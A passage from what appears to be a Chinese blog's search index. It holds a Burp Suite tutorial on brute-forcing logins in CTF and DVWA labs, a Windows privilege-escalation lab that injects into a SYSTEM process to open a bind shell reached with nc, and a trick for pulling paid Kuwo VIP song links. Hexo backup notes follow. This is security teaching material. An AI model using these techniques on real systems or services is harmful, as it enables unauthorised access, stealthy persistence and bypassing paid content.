方便地执行许多任务，包括枚举标识符，获取有用数据，漏洞模糊测试。合适的攻击类型取决于应用程序的情况，可能包括：缺陷测试：SQL 注入，跨站点脚本，缓冲区溢出，路径遍历；暴力攻击认证系统；枚举；操纵参数；拖出隐藏的内容和功能；会话令牌测序和会话劫持；数据挖掘；并发攻击；应用层的拒绝服务式攻击。<br>　　在请求包或者响应包都能右键Send to Intruder<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJBYq.png"></p><h4 id="positions"><a href="#positions" class="headerlink" title="positions"></a>positions</h4><p>　　在positions选项卡下可以看见burp默认标记了一些变量<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8gSK.png"><br>　　先Clear$掉清除变量，这里演示爆破用户名和密码，点击右边的Add$分别将admin和password设置为变量，后面再攻击的时候它将循环替换此处变量内容，从而达到暴力破解<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju86W6.png"><br>　　这里的攻击类型有四种分别是：Sniper(狙击手)、Battering ram(攻城槌)、Pitchfork(杈子)、Cluster bomb(集束炸弹)，稍后会讲，在攻击前先设置Payloads<br>　　如果你要爆破后台的话，将url作为变量也未尝不可以，一句话任何内容都可以设置为变量<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8oFI.png"></p><h4 id="payloads"><a href="#payloads" class="headerlink" title="payloads"></a>payloads</h4><p>　　　选择不同的类型下图中的payload设置也会不同，常用的类型Simple list<br>　　　<img src="https://s1.ax1x.com/2020/04/19/Ju8sF1.png"><br>　　　后面的攻击类型的字典我都会用下图<br>　　　<img src="https://s1.ax1x.com/2020/04/19/Ju8DoR.png"><br>　　　<img src="https://s1.ax1x.com/2020/04/19/Ju8TYt.png"><br>　　　你可以手动添加内容，如上图所示，按回车或者点击Add。或者点击Load从文件中选择一个字典，或者选择burp内置的字典。<br>　　　也可以对payload加工变形，点击Add添加变形类型<br>　　　<img src="https://s1.ax1x.com/2020/04/19/Ju8Bw9.png"><br>　　　仅介绍几个    设payload 有 name admin 两个<br>　　　Add prefix:添加前缀 如添加user后　　payload为:username,useradmin<br>　　　Add suffix:添加后缀 如添加1234后     　payload为:name1234,admin1234<br>　　　Match/replace:匹配/替换　如Match regex:m　Replace with:6 后<br>　　　payload为:na6e,ad6in</p><hr><p>　　　Payload Options设置好后就可以点击Start Attack<br>　　　然后介绍几个payload type<br>　　　<b>Numbers</b><br>　　　<img src="https://s1.ax1x.com/2020/04/19/Ju80eJ.png"><br>　　　<b>Brute forcer</b><br>　　　它是将最小字符到最大字符直接从攻击字符中随便挑选几个字符，比如我这里设置的是4个字符，那么它就会随便挑选4个字符，将所有情况都会尝试，是一种非常暴力的攻击，从图中可以看出有3359232种情况<br>　　　<img src="https://s1.ax1x.com/2020/04/19/Ju8yJx.png"></p><h4 id="Sniper-狙击手"><a href="#Sniper-狙击手" class="headerlink" title="Sniper(狙击手)"></a>Sniper(狙击手)</h4><p>　　此类型先将列表中的内容，先替换变量１的值，不改变变量２的值。然后尝试完后，再将列表中的内容替换变量２的值，不改变变量１的值。有第三个变量的话，以此类推。<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJlFI.png"></p><hr><p>　　<img src="https://s1.ax1x.com/2020/04/18/JnJ1Yt.png"></p><h4 id="Battering-ram-攻城槌"><a href="#Battering-ram-攻城槌" class="headerlink" title="Battering ram(攻城槌)"></a>Battering ram(攻城槌)</h4><p>　　此类型是将列表中的内容替换所有变量<br>　　<img src="https://s1.ax1x.com/2020/04/19/Juwhm6.png"></p><h4 id="Pitchfork-杈子"><a href="#Pitchfork-杈子" class="headerlink" title="Pitchfork(杈子)"></a>Pitchfork(杈子)</h4><p>　　此类型将会设置两个Payload Sets 两个列表中的内容按顺序成对替换<br>　　Payload1设置<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8JJ0.png"></p><hr><p>　　Payload2设置<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8Giq.png"><br>　　可以看出payload1比payload2内容多了一行，前面说过是成对出现，所以你猜开始攻击后会怎么提交payload？<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8ayF.png"><br>　　所以没有匹配内容后就停止发包了</p><h4 id="Cluster-bomb-集束炸弹"><a href="#Cluster-bomb-集束炸弹" class="headerlink" title="Cluster bomb(集束炸弹)"></a>Cluster bomb(集束炸弹)</h4><p>　　此类型是真的全面，举例payload1 有username，admin。payload2有password，passwd，攻击的payload为username password、username passwd、admin password、admin passwd<br>　　payload1 和 payload2不变，依然使用上次的设置，开始攻击<br>　　<img src="https://s1.ax1x.com/2020/04/19/Juwgp9.png"><br>　　此类型和Sniper(狙击手)是经常使用的</p><h4 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h4><p>　　当请求过于杂而多时，这时候筛选器就登场了，设置好后点击其他任意位置后，开始自动筛选<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8UQU.png"></p><h4 id="实战演示"><a href="#实战演示" class="headerlink" title="实战演示"></a>实战演示</h4><h5 id="列子1"><a href="#列子1" class="headerlink" title="列子1"></a>列子1</h5><p>　　此处题目来自于<a href="https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=0&amp;id=5069&amp;page=1">攻防世界</a><br>　　截断靶机请求包，发送进intruder<br>　　<img src="https://s1.ax1x.com/2020/04/19/Juwayq.png"><br>　　选择Cluster bomb攻击类型，设置好变量，配置payload<br>　　<img src="https://s1.ax1x.com/2020/04/19/Juw0mV.png"><br>　　这年头谁还没有个字典呢，开始攻击<br>　　<img src="https://s1.ax1x.com/2020/04/19/JuwBwT.png"><br>　　经过漫长的等待后终于跑完了<br>　　知识点补充:通过响应内容的长度可以作为一个特征来发现那个是正确的密码，或者通过响应的状态码，点击length可以进行升序或者降序排列。<br>　　升序排列后如下图所示，既然用户名正确，哪就慢慢往下找看有没有正确的密码了<br>　　<img src="https://s1.ax1x.com/2020/04/19/JuwskF.png"><br>　　仔细看这独一无二的响应码437，其实一般爆破成功后，length一筛选马上就能发现那个秀儿，成功拿到flag<br>　　<img src="https://s1.ax1x.com/2020/04/19/JuwDTU.png"></p><h5 id="列子2"><a href="#列子2" class="headerlink" title="列子2"></a>列子2</h5><p>　　靶机DVWA前面步骤都大同小异，已经知道登录名和密码了，payload就没必要设置那么多了，直接跳到最后查看结果部分<br>　　可以看到状态码也都一样，length也都一样<br>　　<img src="https://s1.ax1x.com/2020/04/19/JuwyY4.png"><br>　　直接查看验证正确的响应包<br>　　<img src="https://s1.ax1x.com/2020/04/19/JuwdO0.png"><br>　　查看其他的响应包<br>　　<img src="https://s1.ax1x.com/2020/04/19/Juw6fJ.png"><br>　　仔细查看有一处不一样就是Location，一个是index.php，一个是login.php 这两个刚好都是5个字符，所以筛选出含有index.php的结果，这时候就会将我们想要的结果筛选出来<br>　　<img src="https://s1.ax1x.com/2020/04/19/JuwWOx.png"></p><h5 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h5><p>　　此模块我一般称之为自定义发包器，可以手动发送单个请求包。从而查看响应包中的结果来进入测试<br>　　老规矩，随便选择一个请求包，右键发送到Repeater<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJDf0.png"><br>　　来到Repeater模块，具体测试内容可以自己添加或者删除都行<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJ4t1.png"><br>　　右键在请求头中可以看到有很多选择<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8Ksg.png"><br>　　选择Change request method(改变请求方式)后，即POST变成GET，GET变成POST，入图所示，当POST变成GET点击GO，响应包的内容明显跟POST请求的响应包不一样<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8MLQ.png"><br>　　选择Change body encoding之前请求包必须是POST方式，GET方式无效<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8mz8.png"><br>　　当然也可以生成CSRF poc强大到令人发指2333<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8lZj.png"><br>　　选择后新打开CSRF Poc窗口，注意在burp v1.7.32中在浏览器测试我这里已经失效，如果要测试copy html，保存为html文件后，来打开测试<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju81ds.png"><br>　　选择Copy as curl command，会复制curl命令，在记事本中粘贴下来，在kali的命令行中使用命令<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8eRf.png"><br>　　curl是一个非常强大的命令，它会向服务器发起http或者ftp等等请求，然后反馈服务器响应<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju0SAS.png"></p><h3 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h3><p>　　Sequencer(定序器)是一种用于分析数据项的一个样本中的随机性质量的工具。你可以用它来测试应用程序的session tokens(会话tokens)或其他重要数据项的本意是不可预测的，比如反弹CSRF tokens，密码重置tokens等。<br>　　下面演示如何来测试PHPSESSID的随机性，想详细了解session的作用参考这篇文章<a href="https://blog.csdn.net/h19910518/article/details/79348051">session的作用</a><br>　　而且计算机基本都是采用伪随机数算法，即不会做到一个真正现实世界中的随机，理论上来讲只要测试数据量够大，就能找到一个生成的seesion cookie的循环周期，来预测下一个seesion cookie。所以此模块就是评估生成的随机数质量怎么样</p><h5 id="测试DVWA的session"><a href="#测试DVWA的session" class="headerlink" title="测试DVWA的session"></a>测试DVWA的session</h5><h5 id="清除cookie"><a href="#清除cookie" class="headerlink" title="清除cookie"></a>清除cookie</h5><p>　　我这里是测试dvwa的seeion，所以先到登陆页面将cookie清除掉，选择Delete All后<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8OOg.png"></p><h5 id="删除站点"><a href="#删除站点" class="headerlink" title="删除站点"></a>删除站点</h5><p>　　Target-&gt;site map来到站点地图后，选择dvwa站点后右键，delete host，选择yes删除<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8bSf.png"></p><h5 id="抓取set-cookie请求包"><a href="#抓取set-cookie请求包" class="headerlink" title="抓取set-cookie请求包"></a>抓取set-cookie请求包</h5><p>　　清除掉cookie和删除掉站点后，重新进入dvwa的登陆界面，此时burp会重新记录到请求包<br>　　到Proxy-&gt;HTTP history可以看到历史请求，点击filter输入set-cookie，只看设置cookie的<b>响应包</b>过滤完后，找到响应包发送进sequencer<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8RyD.png"><br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju85TA.png"></p><h5 id="选择测试的cookie"><a href="#选择测试的cookie" class="headerlink" title="选择测试的cookie"></a>选择测试的cookie</h5><p>　　burp会自动识别可用的cookie，security是安全级别设置，不是我们要测试的，所以选择PHPSESSID。如果burp没有识别出来，点击手动配置<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJMTA.png"><br>　　手动选择好后，点击ok即可，点击Start live capture(开始实时捕获)开始测试<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJKwd.png"></p><h5 id="查看分析结果"><a href="#查看分析结果" class="headerlink" title="查看分析结果"></a>查看分析结果</h5><p>　　发送的中途你就可以直接点击开始分析，当然数据量越大，得到的结果更准确<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8tzT.png"><br>　　可以看到随机性质量结果的是excellent(优秀)<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJkJx.png"><br>　　<a href="https://baike.baidu.com/item/FIPS%20140-2/635016?fr=aladdin">FIPS</a>(美国联邦信息处理标准)，其提供了密码模块评测、验证和最终认证的基础，所以只要通过了他们的验证标准，加密安全都是高的。可以看到session的评估质量远远高出及格线<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8YWV.png"></p><h3 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h3><p>　　用来编码的加密解密，没有什么可以介绍的。直接网上找一个在线加密解密我都感觉比这个强不少<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8ql8.png"></p><h3 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h3><p>　　比较器，顾名思义比较两次数据之间的区别<br>　　将dvwa中的登陆请求包发送进Repeater模块后，选择发送后，在响应包中右键send to Comparer，这次是正确的用户名和密码<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju84wd.png"><br>　　这次输入错误的用户名和密码，一样发送到比较器<br>　　<img src="https://s1.ax1x.com/2020/04/18/JnJUmQ.png"><br>　　它这个是同一个内容分成了多个窗口而已，第一个窗口选择第一个或者第二个，那么第二个窗口必定要选择不同的，不然自己跟自己比较吗？选择按内容比较<br>　　<img src="https://s1.ax1x.com/2020/04/19/Ju8L6S.png"><br>　　下面是比较结果，当然你也可以比较两个项目的不同<br>　　<img src="https://s1.ax1x.com/2020/04/19/Juw5TO.png"></p><h3 id="Alerts"><a href="#Alerts" class="headerlink" title="Alerts"></a>Alerts</h3><p>　　　此模块是消息提醒，有一个好处就是看代理服务是否开启<br>　　　<img src="https://s1.ax1x.com/2020/04/19/JuwUln.png"></p><h3 id="Extender"><a href="#Extender" class="headerlink" title="Extender"></a>Extender</h3><p>　　Burp在软件中提供了支持第三方拓展插件的功能，方便使用者编写自己的自定义插件或从插件商店中安装拓展插件。<br>　　在BApp Store中，根据受欢迎程度，排名等等筛选出自己喜欢的扩展功能，不多介绍</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>　　burp是一款安全中不可多得的神器，也是从事安全人士必须掌握的一款工具，总之一句话burp牛逼。</p><center><font color="#666666">Thanks♪(･ω･)ﾉ for reading</font></center>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows提权</title>
      <link href="2020/57748.html"/>
      <url>2020/57748.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　本章主要是讲关于win10下的提权合集，温馨提示cmd请以管理员身份运行，不然会出现权限不够等问题。第一次写渗透测试实验报告，如有错误，请多包涵。<br><a id="more"></a></p><h3 id="工具准备"><a href="#工具准备" class="headerlink" title="工具准备"></a>工具准备</h3><p>　　<a href="https://download.sysinternals.com/files/SysinternalsSuite.zip">Sysinternals</a><br>　　<a href="https://www.tarasco.org/security/Process_Injector/index.html">Pinjector</a></p><h3 id="whoami命令"><a href="#whoami命令" class="headerlink" title="whoami命令"></a>whoami命令</h3><p>　　利用whoami查看当前计算机登陆的用户和组<br>　　<img src="https://i0.hdslb.com/bfs/album/7d8be4d3bdfe76ce632439cf4a8cc36f933bb6df.png"><br>　　可以看出当前是在desktop-3vs7u23\lion组中</p><h3 id="psexec提权"><a href="#psexec提权" class="headerlink" title="psexec提权"></a>psexec提权</h3><p>　　将Sysinternals中的psexec.exe拷贝到C:\Windows\System32下后<br>　　输入PsExec.exe -i -s cmd命令<br>　　-i 命令是运行程序，使其与远程系统上指定会话的桌面进行交互<br>　　-s 在系统帐户中运行该服务进程<br>　　<img src="https://i0.hdslb.com/bfs/album/cf30cdaecdfe15a98f4adef1451925acb63a82c1.png"><br>　　这时会弹出一个新的cmd框，在新的cmd框中再次输入whoami命令<br>　　<img src="https://i0.hdslb.com/bfs/album/183a1b3ea3bfcc16aaa1f3313ffd44492eb1130e.png"><br>　　发现用户组已经变成了nt authority\system<br>　　此时试试打开一个notepad，查看登陆用户<br>　　<img src="https://i0.hdslb.com/bfs/album/b60b09d039ff08fadd14d13608bedaa5925cca15.png"><br>　　可以看见登陆用户是system，即在此cmd框中创建的用户都是system</p><h3 id="pinjector注入进程提权"><a href="#pinjector注入进程提权" class="headerlink" title="pinjector注入进程提权"></a>pinjector注入进程提权</h3><p>　　将 pinjector.exe拷贝到C:\Windows\System32下<br>　　执行pinjector -l查看可注入的进程<br>　　<img src="https://i0.hdslb.com/bfs/album/ec1fc70581493c74215661abf4de5f767ecefaa6.png"><br>　　看红线可知有很多用户和组，我们只需要注入带system组的进程<br>　　执行pinjector -l | find “SYSTEM” 查找只包含SYSTEM的进程<br>　　<img src="https://i0.hdslb.com/bfs/album/60552a37d847d643c7d5c50173a1eb48b44b1142.png"><br>　　执行pinjector -p 648 cmd 333<br>　　-p 表示当前的pid然后执行一个cmd命令框并且再本地开启333端口，端口在后面nc会使用<br>　　<img src="https://i0.hdslb.com/bfs/album/17a65c2464172a94af54f15b98244a7c632a0be7.png"><br>　　并不是所有的进程都能注入成功，以下就是失败的情况<br>　　<img src="https://i0.hdslb.com/bfs/album/50c497250217257363a1929428187287c05c39c3.png"><br>　　这时只能一个一个试，直到找到一个能成功注入的进程<br>　　<img src="https://i0.hdslb.com/bfs/album/9b9620095929aa2a0f7520579856afde40c4542a.png"><br>　　执行netstat -an查看端口开启是否成功<br>　　<img src="https://i0.hdslb.com/bfs/album/fe0c8adf067044cd9cff7eacaa7622a17a8d4d1e.png"><br>　　利用nc命令来连接，并查看提权是否成功<br>　　<img src="https://i0.hdslb.com/bfs/album/632da9a79b46110a4610b3b519d94f3d62eafca1.png"><br>　　可以看到提权已经成功了，这时在打开靶机的任务管理器，发现有一个cmd.exe，除此之外并没有多余的进程产生，利用注入进程的方式隐蔽性极高，很难发现<br>　　<img src="https://i0.hdslb.com/bfs/album/13c1581a977412cd23ac25d9f2bd80f955ec8132.png"><br>　　打开Sysinternals中的procexp.exe，此工具是进程管理工具，查看当前有哪些可疑的进程<br>　　<img src="https://i0.hdslb.com/bfs/album/4b599dd8670a013928a928128bac06482fca3f92.png"><br>　　因为我是向sladmin进程注入的，为了演示可以很清楚的看见有一个cmd.exe在运行中，如果注入进一个系统服务后，查找难度可想而知</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>获取酷我音乐，网易云真实外链</title>
      <link href="2020/28534.html"/>
      <url>2020/28534.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在搞博客的时候，总想获取各大网站的音乐外链，试了网上很多方法后，发现各大音乐平台只要是vip才能听的，那些方法都会失效。今天偶然发现酷我音乐亲测有效，又能白嫖一波o(<em>￣︶￣</em>)o。</p><a id="more"></a><h3 id="获取音乐id"><a href="#获取音乐id" class="headerlink" title="获取音乐id"></a>获取音乐id</h3><p>下面以付费音乐为例，下图中可以清楚的看到是付费音乐，其中红线部分是音乐id。<br><img src="https://i0.hdslb.com/bfs/album/a22a726ac925ddeb6f3f8471473c7f64b7a88046.png"></p><h3 id="酷我获取音频外链"><a href="#酷我获取音频外链" class="headerlink" title="酷我获取音频外链"></a>酷我获取音频外链</h3><p>将以下url地址进行拼接<br><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;antiserver.kuwo.cn&#x2F;anti.s?useless&#x3D;&#x2F;resource&#x2F;&amp;format&#x3D;mp3&amp;rid&#x3D;MUSIC_音乐id&amp;response&#x3D;res&amp;type&#x3D;convert_url&amp;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>我的就是<a href="https://antiserver.kuwo.cn/anti.s?useless=/resource/&amp;format=mp3&amp;rid=MUSIC_41476545&amp;response=res&amp;type=convert_url&amp;">https://antiserver.kuwo.cn/anti.s?useless=/resource/&amp;format=mp3&amp;rid=MUSIC_41476545&amp;response=res&amp;type=convert_url&amp;</a><br>至此音频获取成功<br><img src="https://i0.hdslb.com/bfs/album/384ddf522accafc362f218dbb07111e86e5f5bbb.png"></p><h3 id="网易获取音频外链"><a href="#网易获取音频外链" class="headerlink" title="网易获取音频外链"></a>网易获取音频外链</h3><p>列如网易云的音频链接为：<a href="http://music.163.com/#/song?id=317151">http://music.163.com/#/song?id=317151</a><br>真实外链为<br><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;music.163.com&#x2F;song&#x2F;media&#x2F;outer&#x2F;url?id&#x3D;数字.mp3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br><b>就是如此的简单，当然这只是外链党的福音，至于有效期是多久就看运气吧。如果你只是想单纯的听听音乐，我还是建议去搞个KuWo音乐破解版吧</b></p><center><font style="font-size:15px;color:grey;">每天学一点儿黑科技，走进互联网真实大门</font></center>]]></content>
      
      
      <categories>
          
          <category> 黑科技 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 音乐外链 </tag>
            
            <tag> KuWo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客恢复</title>
      <link href="2020/35585.html"/>
      <url>2020/35585.html</url>
      
        <content type="html"><![CDATA[<p>标题的意思是指如何在其他电脑继续使用hexo写博客，前提是你备份了你的hexo文件，注意当你配置好了hexo环境后，勿用hexo init命令。</p><a id="more"></a><h3 id="拷贝以下文件到博客根目录下"><a href="#拷贝以下文件到博客根目录下" class="headerlink" title="拷贝以下文件到博客根目录下"></a>拷贝以下文件到博客根目录下</h3><pre class="line-numbers language-none"><code class="language-none">_config.yml package.json scaffolds&#x2F; source&#x2F; themes&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="执行模块安装的命令"><a href="#执行模块安装的命令" class="headerlink" title="执行模块安装的命令"></a>执行模块安装的命令</h3><pre class="line-numbers language-none"><code class="language-none">npm install -g hexonpm installnpm install hexo-deployer-git --savenpm install hexo-generator-feed --savenpm install hexo-generator-sitemap --save<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="开始部署"><a href="#开始部署" class="headerlink" title="开始部署"></a>开始部署</h3><pre class="line-numbers language-none"><code class="language-none">hexo ghexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>提醒一下，当你在其他电脑执行hexo d命令时，远程仓库的commits将会全部清空。</p>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客备份</title>
      <link href="2020/38686.html"/>
      <url>2020/38686.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>强烈建议hexo博客搭建完毕后，并且上传到github后，做的第一件事情是去将你的hexo博客备份到github上去。我知道你肯定很开心搭建博客成功，想怎么怎么去美化你的博客，我想说数据无价，如果你跟笔者有着因为没有备份hexo博客数据，而造成不可逆的后果后，想想都是泪，备份完后再去美化你的博客吧！</p><a id="more"></a><h3 id="建立hexo分支"><a href="#建立hexo分支" class="headerlink" title="建立hexo分支"></a>建立hexo分支</h3><p>在博客目录下输入新分支命令(比如我的博客在E:\blog)</p><pre class="line-numbers language-none"><code class="language-none">git checkout -b hexo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>hexo</strong>是自定义的分支的名称，建议命名成hexo</p><h3 id="提交分支到Github"><a href="#提交分支到Github" class="headerlink" title="提交分支到Github"></a>提交分支到Github</h3><p>一样在hexo博客的目录下输入以下命令</p><pre class="line-numbers language-none"><code class="language-none">git add .&#x2F;&#x2F;注意add后面有一个空格git commit -m &quot;Backup&quot;git push origin hexo&#x2F;&#x2F;将hexo分支提交到github上去<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>你提交分支可能会失败，这里每个人的情况不一样，根据报错信息,自己解决，我反正搞了很久才提交成功。<br>提交成功后，你可以看到github上有两个分支如图所示.<br><img src="" data-echo="hexo博客备份/successful.png" alt=""></p><h3 id="安装hexo备份插件"><a href="#安装hexo备份插件" class="headerlink" title="安装hexo备份插件"></a>安装hexo备份插件</h3><p>输入命令<code>hexo version</code>查看Hexo版本</p><p><img src="" data-echo="hexo博客备份/hexo_version.png" alt=""></p><p>Hexo版本是2.x.x使用以下命令,我的版本可以看到是4.2.0</p><pre class="line-numbers language-none"><code class="language-none">npm install hexo-git-backup@0.0.91 --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Hexo版本是3.x.x使用,我的虽然是4.2.0使用下面命令亲测有效</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> hexo-git-backup --save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>到Hexo博客的根目录<code>_config.yml</code>添加以下配置,添加到文件末尾即可</p><pre class="line-numbers language-none"><code class="language-none">backup:  type: git  theme: yelee  message: Back up my blog  repository:    github: git@github.com:githubname&#x2F;githubname.github.io.git,hexo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>theme:选择备份的主题<br>message:自定义提交信息<br>repository:仓库名,分支名，已经建立过hexo分支，所以填hexo，githubname填写成你github上的用户名</p><h3 id="备份博客数据"><a href="#备份博客数据" class="headerlink" title="备份博客数据"></a>备份博客数据</h3><p>最后输入以下命令开始备份博客</p><pre class="line-numbers language-none"><code class="language-none">hexo b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>备份成功后，你将在你的分支下看到备份好的数据</p><p><img src="" data-echo="hexo博客备份/backup.png" alt=""></p><p>如果你没有备份成功，那么请使用hexo b后再使用git push origin hexo命令,反正我是没有备份成功后，找了半天教程，才发现这样我才能备份成功，无语了。</p><p>以上内容我不能保证你100%成功，那么请善用搜索引擎，成功绝对不是偶然。</p><center>♥感谢你的阅读♥</center>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
